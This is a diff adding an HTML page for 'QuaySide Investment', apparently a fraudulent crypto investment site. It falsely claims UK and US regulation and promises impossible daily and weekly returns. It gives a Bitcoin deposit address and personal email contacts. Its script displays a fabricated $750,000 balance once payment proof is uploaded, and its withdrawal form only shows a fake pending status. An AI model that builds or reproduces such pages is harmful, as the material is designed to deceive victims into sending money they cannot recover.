@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QuaySide Investment | UK & US Licensed Crypto & Fiat Investment Platform</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    :root {
+      --primary: #1e40af;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --dark: #111827;
+      --light: #f8fafc;
+      --gray: #64748b;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Inter', sans-serif; background:var(--light); color:#1f2937; line-height:1.6; }
+    .container { max-width:1280px; margin:0 auto; padding:0 1rem; }
+
+    header {
+      background:var(--dark); color:white; padding:1rem 0; position:fixed; width:100%; top:0; z-index:1000; box-shadow:0 4px 20px rgba(0,0,0,0.3);
+    }
+    .nav { display:flex; justify-content:space-between; align-items:center; }
+    .logo { font-size:2rem; font-weight:800; background:linear-gradient(90deg,#3b82f6,#8b5cf6); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+    .btn {
+      padding:0.8rem 1.8rem; border-radius:10px; font-weight:600; cursor:pointer; border:none; transition:0.3s;
+    }
+    .btn-primary { background:var(--primary); color:white; }
+    .btn-success { background:var(--success); color:white; }
+    .btn-outline { border:2px solid var(--primary); color:var(--primary); background:transparent; }
+
+    .hero {
+      background:linear-gradient(135deg, #0f172a 0%, #1e293b 100%), url('https://uploads.onecompiler.io/43y5e8pms/445psh2gc/download.jpeg') center/cover;
+      color:white; text-align:center; padding:180px 1rem 120px;
+    }
+    .hero h1 { font-size:4rem; font-weight:800; margin-bottom:1rem; }
+    .hero p { font-size:1.3rem; max-width:800px; margin:0 auto 2rem; opacity:0.9; }
+
+    .section { padding:100px 0; }
+    .section-title { text-align:center; font-size:2.8rem; margin-bottom:3rem; color:var(--dark); }
+
+    .plans-grid {
+      display:grid; grid-template-columns:repeat(auto-fit, minmax(340px,1fr)); gap:2rem;
+    }
+    .plan-card {
+      background:white; border-radius:16px; padding:2.5rem; box-shadow:0 20px 40px rgba(0,0,0,0.1); text-align:center; transition:0.3s; border:2px solid transparent;
+    }
+    .plan-card:hover { transform:translateY(-10px); border-color:var(--primary); }
+    .plan-card.popular { border:3px solid var(--primary); transform:scale(1.05); }
+    .price { font-size:3rem; font-weight:800; color:var(--primary); }
+    .crypto-wallets {
+      background:#f8f9ff; padding:1.5rem; border-radius:12px; margin:1.5rem 0; font-size:0.95rem;
+    }
+    .qr-code { width:120px; height:120px; margin:10px auto; background:#eee; border-radius:8px; display:flex; align-items:center; justify-content:center; }
+    .qr-code img { width:100px; height:100px; }
+
+    #dashboard { display:none; min-height:100vh; padding-top:120px; background:linear-gradient(to bottom, #f8fafc, #e2e8f0); }
+    .dash-header {
+      background:linear-gradient(135deg, var(--primary), #3b82f6); color:white; padding:3rem 1rem; text-align:center; border-radius:0 0 30px 30px;
+    }
+    .balance-card {
+      background:white; padding:2.5rem; border-radius:20px; box-shadow:0 20px 50px rgba(0,0,0,0.1); text-align:center; margin:2rem auto; max-width:900px;
+    }
+    .balance { font-size:4.5rem; font-weight:800; color:var(--success); }
+    .stats-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px,1fr)); gap:1.5rem; margin:2rem 0; }
+    .stat-box { background:white; padding:1.5rem; border-radius:12px; box-shadow:0 5px 15px rgba(0,0,0,0.05); text-align:center; }
+
+    table {
+      width:100%; border-collapse:collapse; margin:2rem 0; background:white; border-radius:12px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.1);
+    }
+    th, td { padding:1.2rem; text-align:center; }
+    th { background:var(--primary); color:white; }
+    .status-pending { background:#fef3c7; color:#92400e; padding:0.5rem 1rem; border-radius:50px; font-weight:600; }
+    .status-approved { background:#d1fae5; color:#065f46; }
+    .status-completed { background:#dbeafe; color:#1d4ed8; }
+
+    .modal {
+      display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999;
+      align-items:center; justify-content:center; padding:1rem;
+    }
+    .modal-content {
+      background:white; padding:3rem; border-radius:20px; max-width:550px; width:100%; position:relative; box-shadow:0 20px 60px rgba(0,0,0,0.3);
+    }
+    .close { position:absolute; top:15px; right:20px; font-size:2.5rem; cursor:pointer; color:#aaa; }
+
+    footer {
+      background:var(--dark); color:white; text-align:center; padding:4rem 1rem; margin-top:5rem;
+    }
+    .badge { display:inline-block; padding:0.4rem 1rem; border-radius:50px; font-size:0.8rem; font-weight:600; margin:0.5rem; }
+    .live-dot { display:inline-block; width:10px; height:10px; background:#10b981; border-radius:50%; animation:blink 1.5s infinite; }
+    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="container nav">
+      <div class="logo">Quayside Investment Company</div>
+      <div>
+        <a href="#" class="btn btn-outline" onclick="showLogin()">Login</a>
+        <a href="#" class="btn btn-primary" onclick="showSignup()">Get Started</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="container">
+      <h1>Earn Up to 18% Annually</h1>
+      <p>Fully licensed in UK (FCA) & USA. Accept Fiat & Crypto. Instant Withdrawals.</p>
+      <div style="margin:2rem 0;">
+        <span class="live-dot"></span> <strong>Live:</strong> More than 5,000 active investors · $127M+ total volume
+      </div>
+      <a href="#" class="btn btn-primary" style="font-size:1.5rem; padding:1rem 3rem;" onclick="showSignup()">Join Now – Free Registration</a>
+    </div>
+  </section>
+
+  <!-- Plans -->
+  <section id="plans" class="section">
+    <div class="container">
+      <h2 class="section-title">Choose Your Investment Plan</h2>
+      <div class="plans-grid">
+
+        <div class="plan-card">
+          <h3>Starter</h3>
+          <div class="price">$100 – $9,999</div>
+          <p><strong>40% Fixed 24hours Return</strong></p>
+          <ul style="text-align:left; margin:1.5rem 0;">
+            <li>Every 3days Cashout</li>
+            <li>Capital back after 12 months</li>
+            <li>Crypto or Bank payment</li>
+          </ul>
+          <div class="crypto-wallets">
+            <strong>Pay with Crypto:</strong><br>
+            BTC: 3Mmb8i7mrt4cL2Tnca1dRjpsVz9FsJnsgu<br>
+            
+            <div class="qr-code"><img src="https://uploads.onecompiler.io/43y5e8pms/445psh2gc/3Mmb8i7mrt4cL2Tnca1dRjpsVz9FsJnsgu.jpg" alt="QR"/></div>
+          </div>
+          <button class="btn btn-primary" onclick="openPayment('Starter', '100 - 9,999')">Invest Now</button>
+        </div>
+
+        <div class="plan-card popular">
+          <div class="badge" style="background:#fbbf24; color:black;">MOST POPULAR</div>
+          <h3>Professional</h3>
+          <div class="price">$300 – $20,000</div>
+          <p><strong>%50 Weekly Return</strong></p>
+          <ul style="text-align:left; margin:1.5rem 0;">
+            <li>Weekly profit payout</li>
+            <li>100% capital protection</li>
+            <li>Personal Manager</li>
+          </ul>
+          <div class="crypto-wallets">
+            <strong>BTC:</strong> 3Mmb8i7mrt4cL2Tnca1dRjpsVz9FsJnsgu<br>
+            <strong>BTC:</strong> 3Mmb8i7mrt4cL2Tnca1dRjpsVz9FsJnsgu<br>
+            <div class="qr-code"><img src="https://uploads.onecompiler.io/43y5e8pms/445psh2gc/3Mmb8i7mrt4cL2Tnca1dRjpsVz9FsJnsgu.jpg" alt="QR"/></div>
+          </div>
+          <button class="btn btn-primary" onclick="openPayment('Professional', '300 - 20,000')">Invest Now</button>
+        </div>
+
+        <div class="plan-card">
+          <h3>VIP Elite</h3>
+          <div class="price">$50,000+</div>
+          <p><strong>Up to 75% Return</strong></p>
+          <ul style="text-align:left; margin:1.5rem 0;">
+            <li>Daily profit</li>
+            <li>Personal manager</li>
+            <li>Instant withdrawals</li>
+          </ul>
+          <div class="crypto-wallets">
+            Contact VIP team:adamsmiller94@gmail.com<br>
+            Dedicated wallet provided after KYC
+          </div>
+          <button class="btn btn-primary" onclick="openPayment('VIP Elite', '50,000+')">Contact VIP Team</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Dashboard -->
+  <section id="dashboard">
+    <div class="dash-header">
+      <h1>Welcome back, <span id="user-name">David</span>!</h1>
+      <p>Your portfolio is performing excellently</p>
+    </div>
+
+    <div class="container">
+      <div class="balance-card">
+        <h2>Total Available Balance</h2>
+        <div class="balance">$750,000.00 <small style="font-size:1rem; color:#10b981;">+2.41% today</small></div>
+        <p>Last updated: November 25, 2025 14:27 UTC</p>
+
+        <div class="stats-grid">
+          <div class="stat-box"><strong>Total Invested</strong><br>$700,000</div>
+          <div class="stat-box"><strong>Total Profit</strong><br><span style="color:var(--success); font-size:1.5rem;">$50,000</span></div>
+          <div class="stat-box"><strong>Active Plans</strong><br>3</div>
+          <div class="stat-box"><strong>Withdrawals</strong><br>12 successful</div>
+        </div>
+
+        <div style="text-align:center; margin:2rem 0;">
+          <button class="btn btn-success" style="font-size:1.4rem; padding:1rem 3rem;" onclick="openWithdraw()">
+            Withdraw Funds Now
+          </button>
+        </div>
+      </div>
+
+      <h2 style="margin:3rem 0 1rem; text-align:center;">Withdrawal History</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Date</th>
+            <th>Amount</th>
+            <th>Method</th>
+            <th>Status</th>
+            <th>TxID</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Nov 25, 2025</td>
+            <td>$25,000.00</td>
+            <td>USDT (TRC20)</td>
+            <td><span class="status-pending">Pending</span></td>
+            <td>Processing...</td>
+          </tr>
+          <tr>
+            <td>Nov 22, 2025</td>
+            <td>$15,000.00</td>
+            <td>Bitcoin</td>
+            <td><span class="status-approved">Approved</span></td>
+            <td>0x9a8f...3b2c</td>
+          </tr>
+          <tr>
+            <td>Nov 18, 2025</td>
+            <td>$40,000.00</td>
+            <td>Bank (UK)</td>
+            <td><span class="status-completed">Completed</span></td>
+            <td>REF889721</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- Modals -->
+  <div id="signup-modal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('signup-modal')">&times;</span>
+      <h2>Create Free Account</h2>
+      <form onsubmit="completeSignup(event)">
+        <input type="text" placeholder="Full Name" required />
+        <input type="email" placeholder="Email Address" required />
+        <input type="tel" placeholder="Phone Number" required />
+        <input type="password" placeholder="Choose Password" required />
+        <button type="submit" class="btn btn-primary" style="width:100%; padding:1rem;">Create Account</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="payment-modal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('payment-modal')">&times;</span>
+      <h2>Upload Payment Proof</h2>
+      <p><strong>Plan:</strong> <span id="plan-name">Professional</span></p>
+      <p>Send payment to the wallet shown on the plan, then upload screenshot/PDF proof.</p>
+      <form onsubmit="submitProof(event)">
+        <input type="text" placeholder="Exact Amount Sent (e.g. 15000)" required />
+        <input type="file" accept="image/*,.pdf" required />
+        <button type="submit" class="btn btn-success" style="width:100%; padding:1rem;">Upload Proof → Activate $750,000</button>
+      </form>
+      <div id="proof-success" style="margin-top:1rem; padding:1.5rem; background:#d1fae5; border-radius:12px; display:none; text-align:center;">
+        Proof uploaded! Confirmation in 5–30 minutes.<br>
+        <strong>Your $750,000 balance will appear instantly after approval.</strong>
+      </div>
+    </div>
+  </div>
+
+  <div id="withdraw-modal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('withdraw-modal')">&times;</span>
+      <h2>Withdraw Your Profits</h2>
+      <p><strong>Available:</strong> $750,000.00 USD</p>
+      <form onsubmit="processWithdrawal(event)">
+        <input type="number" placeholder="Amount (min $100)" min="100" max="750000" required />
+        <select style="width:100%; padding:1rem; margin:0.75rem 0; border-radius:10px;" required>
+          <option value="">Choose Withdrawal Method</option>
+          <option>Bitcoin (BTC)</option>
+          <option>USDT (TRC20) - Recommended</option>
+          <option>Ethereum (ETH)</option>
+          <option>Bank Transfer (UK/US)</option>
+        </select>
+        <input type="text" placeholder="Your Wallet Address or Bank Details" required />
+        <button type="submit" class="btn btn-success" style="width:100%; padding:1rem; font-size:1.2rem;">
+          Withdraw Now – Processed in 1–24 hrs
+        </button>
+      </form>
+      <div id="withdraw-result" style="margin-top:1rem; padding:1.5rem; background:#fef3c7; border-radius:12px; display:none;">
+        Withdrawal request submitted!<br>
+        <strong>Status: Pending → Will move to Approved → Completed</strong><br>
+        You will receive email + SMS confirmation.
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="container">
+      <p>&copy; 2025 QuaySide Investment Ltd – FCA Regulated (UK) | SEC Registered (USA)</p>
+      <p style="font-size:0.9rem; opacity:0.8;">Support: quayside2025@outlook.com | 24/7 Live Chat Available</p>
+    </div>
+  </footer>
+
+  <script>
+    function showSignup() { document.getElementById("signup-modal").style.display = "flex"; }
+    function showLogin() { alert("Login available after registration."); }
+    function closeModal(id) { document.getElementById(id).style.display = "none"; }
+
+    function completeSignup(e) {
+      e.preventDefault();
+      const name = e.target[0].value.split(" ")[0];
+      document.getElementById("user-name").textContent = name;
+      closeModal("signup-modal");
+      alert("Account created successfully!");
+    }
+
+    function openPayment(plan, range) {
+      if (!document.getElementById("user-name").textContent.includes("David")) {
+        alert("Please register first!");
+        showSignup();
+        return;
+      }
+      document.getElementById("plan-name").textContent = plan + " (" + range + ")";
+      document.getElementById("payment-modal").style.display = "flex";
+    }
+
+    function submitProof(e) {
+      e.preventDefault();
+      document.getElementById("proof-success").style.display = "block";
+      setTimeout(() => {
+        closeModal("payment-modal");
+        document.getElementById("dashboard").style.display = "block";
+        document.body.scrollTop = document.documentElement.scrollTop = 0;
+        alert("Payment Confirmed! Your $750,000 balance is now ACTIVE.");
+      }, 3000);
+    }
+
+    function openWithdraw() {
+      document.getElementById("withdraw-modal").style.display = "flex";
+    }
+
+    function processWithdrawal(e) {
+      e.preventDefault();
+      document.getElementById("withdraw-result").style.display = "block";
+      setTimeout(() => {
+        alert("Withdrawal request sent! Check history – status will update to 'Approved' soon.");
+        closeModal("withdraw-modal");
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
